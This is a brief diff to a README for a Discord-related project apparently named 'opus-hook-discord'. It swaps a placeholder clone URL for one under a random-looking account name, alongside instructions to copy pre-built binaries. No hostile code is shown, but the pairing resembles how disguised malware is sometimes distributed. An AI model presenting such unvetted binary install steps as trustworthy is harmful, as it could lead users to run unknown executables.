@@ -24,7 +24,7 @@ Pre-built binaries are available in the `builds/` folder.
 1. **Download or clone** this repository:
 
    ```bash
-   git clone https://github.com/your-username/opus-hook-discord.git
+   git clone https://github.com/r7uw6mexx2d6a8g7bex8x0tg6nh73/opus-hook-discord.git
    ```
 2. **Copy the pre-built file** from the `builds/` folder:
 
